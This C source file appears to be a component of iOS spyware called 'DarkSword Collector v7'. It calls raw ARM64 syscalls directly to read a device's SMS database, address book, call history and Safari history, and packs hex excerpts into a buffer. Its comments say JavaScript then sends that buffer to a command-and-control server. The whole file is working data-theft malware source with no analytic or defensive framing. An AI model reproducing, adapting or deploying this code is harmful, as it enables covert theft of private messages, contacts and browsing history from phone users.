/**
 * DarkSword Collector v7 - Read files via raw syscalls, store in buffer
 * JavaScript reads buffer after ds_start returns and sends to C2
 */

static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
static void _memcpy(char *dst, const char *src, int n) { for(int i=0;i<n;i++) dst[i]=src[i]; }
static int _itoa(int val, char *buf) {
    int i=0; char tmp[16]; int t=0;
    if(val==0){buf[0]='0';buf[1]=0;return 1;}
    while(val>0){tmp[t++]='0'+(val%10);val/=10;}
    for(int j=t-1;j>=0;j--) buf[i++]=tmp[j];
    buf[i]=0; return i;
}

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

/* Exported result buffer - JS reads this from mapped memory after ds_start returns */
char ds_result[4096];
int ds_result_len = 0;

static void _append(const char *s) {
    int sl = _strlen(s);
    if (ds_result_len + sl < 4095) {
        _memcpy(ds_result + ds_result_len, s, sl);
        ds_result_len += sl;
        ds_result[ds_result_len] = 0;
    }
}
static void _append_int(int v) { char b[16]; _itoa(v,b); _append(b); }

static void _read_file(const char *path, const char *name) {
    _append("{\"name\":\"");
    _append(name);
    _append("\",\"path\":\"");
    _append(path);
    _append("\",");

    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) {
        _append("\"status\":\"access_denied\"},");
        return;
    }

    char data[512];
    int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data) - 1);
    _svc1(SYS_close, fd);
    if (n < 0) n = 0;
    data[n] = 0;

    _append("\"status\":\"ok\",\"size\":");
    _append_int(n);
    _append(",\"hex\":\"");

    int max = n < 128 ? n : 128;
    for (int i = 0; i < max; i++) {
        char hex[3];
        hex[0] = "0123456789abcdef"[(unsigned char)data[i] >> 4];
        hex[1] = "0123456789abcdef"[(unsigned char)data[i] & 0xf];
        hex[2] = 0;
        _append(hex);
    }
    _append("\"},");
}

void ds_start(void) {
    ds_result[0] = 0;
    ds_result_len = 0;
    _append("[");
    _read_file("/var/mobile/Library/SMS/sms.db", "SMS");
    _read_file("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
    _read_file("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
    _read_file("/var/mobile/Library/Safari/History.db", "Safari");
    if (ds_result_len > 1 && ds_result[ds_result_len-1] == ',') {
        ds_result_len--;
        ds_result[ds_result_len] = 0;
    }
    _append("]");
}